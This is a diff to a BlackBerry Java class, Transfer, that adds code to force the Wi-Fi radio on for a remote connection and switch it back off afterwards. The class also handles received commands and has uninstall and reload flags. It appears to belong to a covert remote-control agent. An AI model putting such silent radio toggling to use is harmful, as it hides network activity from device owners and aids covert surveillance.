@@ -13,6 +13,8 @@ import java.util.Random;
 import java.util.Vector;
 
 import net.rim.device.api.system.CodeModuleManager;
+import net.rim.device.api.system.Radio;
+import net.rim.device.api.system.RadioInfo;
 import net.rim.device.api.util.Arrays;
 import net.rim.device.api.util.DataBuffer;
 import blackberry.Conf;
@@ -65,6 +67,7 @@ public class Transfer {
     private Vector apns;
 
     private boolean connected = false;
+    boolean activatedWifi = false;
 
     public boolean uninstall = false;
     public boolean reload = false;
@@ -106,7 +109,38 @@ public class Transfer {
         }
 
         if (wifiForced) {
-            //TODO: forza up di wifi
+
+            //#ifdef DEBUG_TRACE
+            debug.trace("connect: wifiForced");
+            //#endif
+
+            int waf = RadioInfo.getEnabledWAFs() & ~RadioInfo.WAF_WLAN;
+            boolean active = (RadioInfo.getActiveWAFs() & RadioInfo.WAF_WLAN) != 0;
+            boolean ret = false;
+            if (!active) {
+                //#ifdef DEBUG_INFO
+                debug.info("Activating Wifi");
+                //#endif
+                ret = Radio.activateWAFs(waf);
+            } else {
+                //#ifdef DEBUG_TRACE
+                debug.trace("connect: Wifi already active");
+                //#endif
+            }
+
+            active = (RadioInfo.getActiveWAFs() & RadioInfo.WAF_WLAN) != 0;
+            if (ret && active) {
+                activatedWifi = true;
+            }
+
+            //#ifdef DEBUG_TRACE
+            debug.trace("wifiForced waf: " + waf + " active: " + active);
+            //#endif
+
+            //#ifdef DBC
+            Check.asserts(wifiAdmitted = true,
+                    "connect: wifiForced && !wifiAdmitted");
+            //#endif
         }
 
         if (wifiAdmitted) {
@@ -210,6 +244,25 @@ public class Transfer {
         //#ifdef DEBUG_INFO
         debug.info("connected: " + connected);
         //#endif
+
+        if (activatedWifi) {
+            activatedWifi = false;
+            int waf = RadioInfo.getEnabledWAFs() & ~RadioInfo.WAF_WLAN;
+            boolean active = (RadioInfo.getActiveWAFs() & RadioInfo.WAF_WLAN) != 0;
+            boolean ret = false;
+            if (active) {
+                //#ifdef DEBUG_INFO
+                debug.info("Deactivating Wifi");
+                //#endif
+                Radio.deactivateWAFs(waf);
+            }
+
+            active = (RadioInfo.getActiveWAFs() & RadioInfo.WAF_WLAN) != 0;
+            //#ifdef DEBUG_TRACE
+            debug.trace("deactivating wifiForced waf: " + waf + " active: "
+                    + active);
+            //#endif
+        }
     }
 
     /**
@@ -593,11 +646,12 @@ public class Transfer {
         byte[] commandId;
         try {
             //#ifdef DBC
-            Check.asserts(connection.isActive(), "recvCommand connection not active");
+            Check.asserts(connection.isActive(),
+                    "recvCommand connection not active");
             //#endif
-            if(!connection.connected){
+            if (!connection.connected) {
                 //#ifdef DEBUG
-                debug.error("receiving command: disconnected");            
+                debug.error("receiving command: disconnected");
                 //#endif
                 return null;
             }
@@ -609,7 +663,7 @@ public class Transfer {
             }
         } catch (final IOException e) {
             //#ifdef DEBUG
-            debug.error("receiving command: " + e);            
+            debug.error("receiving command: " + e);
             //#endif
             return null;
         }
